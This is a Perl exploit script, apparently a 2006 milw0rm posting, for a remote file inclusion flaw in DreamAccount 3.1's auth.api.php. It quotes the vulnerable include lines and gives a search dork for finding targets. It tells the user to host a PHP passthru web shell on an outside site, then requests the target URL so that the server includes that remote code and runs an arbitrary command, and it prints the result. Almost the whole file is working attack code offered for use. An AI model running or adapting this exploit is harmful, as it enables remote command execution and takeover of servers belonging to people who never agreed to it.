#!/usr/bin/perl
use HTTP::Request;
use LWP::UserAgent;
# ----------------------------------------------------
# DREAMACCOUNT V3.1 Remote Command Execution Exploit    
# ----------------------------------------------------
# Discovered By CrAsh_oVeR_rIdE(Arabian Security Team)
# Coded By Drago84(Exclusive Security Team)           
# ----------------------------------------------------
# site of script:http://dreamcost.com                 
# ----------------------------------------------------
# Vulnerable: DREAMACCOUNT V3.1                       
# ----------------------------------------------------
# vulnerable file :                                    
# ------------------                                  
# auth.api.php                                    
# ----------------------------------------------------
# vulnerable code:                                    
# ----------------------------------------------------
# require_once($path . 'mod_htaccess.inc.php');   // 0
# require_once($path . 'mod_pmachine.inc.php');   // 4
# require_once($path . 'mod_vbulletin.inc.php');  // 5
# require_once($path . 'mod_phpbb.inc.php');      // 6
# require_once($path . 'mod_postnuke.inc.php');   // 7
# require_once($path . 'mod_phpnuke.inc.php');    // 8
# require_once($path . 'mod_freeradius.inc.php'); // 9
# require_once($path . 'mod_ldap.inc.php');       // 10
# require_once($path . 'mod_invboard.inc.php');   // 11
# require_once($path . 'mod_yabbse.inc.php');     // 12
# require_once($path . 'mod_mambo.inc.php');      // 13
# require_once($path . 'mod_xaraya.inc.php');     // 14
# require_once($path . 'mod_geeklog.inc.php');    // 15
#   
# $path parameter File inclusion                      
# ----------------------------------------------------
# Exploit:
# ---------
print "\n=============================================================================\r\n";
print " * Dreamaccount Remote Command Execution  23/06/06 *\r\n";   
print "=============================================================================\r\n";
print "[*] dork:\"powered by DreamAccount 3.1\"\n";
print "[*] Coded By : Drago84 \n";
print "[*] Discovered by CrAsH_oVeR_rIdE\n";
print "[*] Use <site> <dir_Dream> <eval site> <cmd>\n";
print " Into the Eval Site it must be:\n\n";
print " Exclusive <?php  passthru($_GET[cmd]); ?> /Exclusive";

if (@ARGV < 4)
{
print "\n\n[*] usage: perl dream.pl <site> <dir dream> <eval site> <cmd>\n";
print "[*] usage: perl dream.pl www.HosT.com /dreamaccount/ http://www.site.org/doc.jpg id\n";
print "[*] uid=90(nobody) gid=90(nobody) egid=90(nobody) \n";
exit();
}
my $dir=$ARGV[1];
my $host=$ARGV[0];
my $eval=$ARGV[2];
my $cmd=$ARGV[3];
my $url2=$host.$dir."auth.api.php?path=".$eval."?&cmd=".$cmd;
print "\n";
my $req=HTTP::Request->new(GET=>$url2);
my $ua=LWP::UserAgent->new();
$ua->timeout(10);
my $response=$ua->request($req);
if ($response->is_success) {
print "\n\nResult of:".$cmd."\n";
my ($pezzo_utile) = ( $response->content =~ m{Exclusive(.+)\/Exclusive}smx );
printf $1;
$response->content;
print "\n";

} 

# ----------------------------------------------------------------------------------------------------
# Discovered By CrAsh_oVeR_rIdE
# Coded By  Drago84
# E-mail:KARKOR23@hotmail.com
# Site:www.lezr.com
# Greetz:KING-HACKER,YOUNG_HACKER,SIMO,ROOT-HACKED,SAUDI,QPTAN,POWERWALL,SNIPER_SA,Black-Code,ALMOKAN3,Mr.hcR AND ALL LEZR.COM Member

# milw0rm.com [2006-06-25]
